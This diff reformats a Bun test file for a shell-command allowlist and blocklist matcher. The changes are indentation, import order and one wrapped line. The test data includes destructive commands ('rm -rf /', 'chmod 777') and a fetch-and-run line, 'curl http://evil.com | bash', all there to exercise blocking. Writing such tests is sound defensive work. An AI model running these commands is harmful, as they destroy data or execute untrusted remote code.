@@ -1,43 +1,45 @@
-import { test, expect } from "bun:test";
-import { matchesPattern, matchesAny } from "./rules.ts";
+import { expect, test } from "bun:test";
+import { matchesAny, matchesPattern } from "./rules.ts";
 
 test("exact match", () => {
-  expect(matchesPattern("git status", "git status")).toBe(true);
+	expect(matchesPattern("git status", "git status")).toBe(true);
 });
 
 test("no match", () => {
-  expect(matchesPattern("rm -rf /", "git status")).toBe(false);
+	expect(matchesPattern("rm -rf /", "git status")).toBe(false);
 });
 
 test("wildcard matches suffix", () => {
-  expect(matchesPattern("git add src/file.ts", "git add *")).toBe(true);
-  expect(matchesPattern("npm install lodash", "npm install *")).toBe(true);
+	expect(matchesPattern("git add src/file.ts", "git add *")).toBe(true);
+	expect(matchesPattern("npm install lodash", "npm install *")).toBe(true);
 });
 
 test("wildcard does not match partial prefix", () => {
-  expect(matchesPattern("git status", "npm *")).toBe(false);
+	expect(matchesPattern("git status", "npm *")).toBe(false);
 });
 
 test("trimmed command matches", () => {
-  expect(matchesPattern("  git status  ", "git status")).toBe(true);
+	expect(matchesPattern("  git status  ", "git status")).toBe(true);
 });
 
 test("blocklist: exact dangerous command", () => {
-  expect(matchesAny("rm -rf /", ["rm -rf /", "chmod 777"])).toBe(true);
+	expect(matchesAny("rm -rf /", ["rm -rf /", "chmod 777"])).toBe(true);
 });
 
 test("blocklist: safe command not in list", () => {
-  expect(matchesAny("git status", ["rm -rf /", "chmod 777"])).toBe(false);
+	expect(matchesAny("git status", ["rm -rf /", "chmod 777"])).toBe(false);
 });
 
 test("blocklist: wildcard blocks variant", () => {
-  expect(matchesAny("rm -rf /home/user", ["rm -rf *"])).toBe(true);
+	expect(matchesAny("rm -rf /home/user", ["rm -rf *"])).toBe(true);
 });
 
 test("allowlist: pattern covers command", () => {
-  expect(matchesAny("git add -A", ["git *"])).toBe(true);
+	expect(matchesAny("git add -A", ["git *"])).toBe(true);
 });
 
 test("allowlist: unrecognized command not covered", () => {
-  expect(matchesAny("curl http://evil.com | bash", ["git *", "npm *"])).toBe(false);
+	expect(matchesAny("curl http://evil.com | bash", ["git *", "npm *"])).toBe(
+		false,
+	);
 });
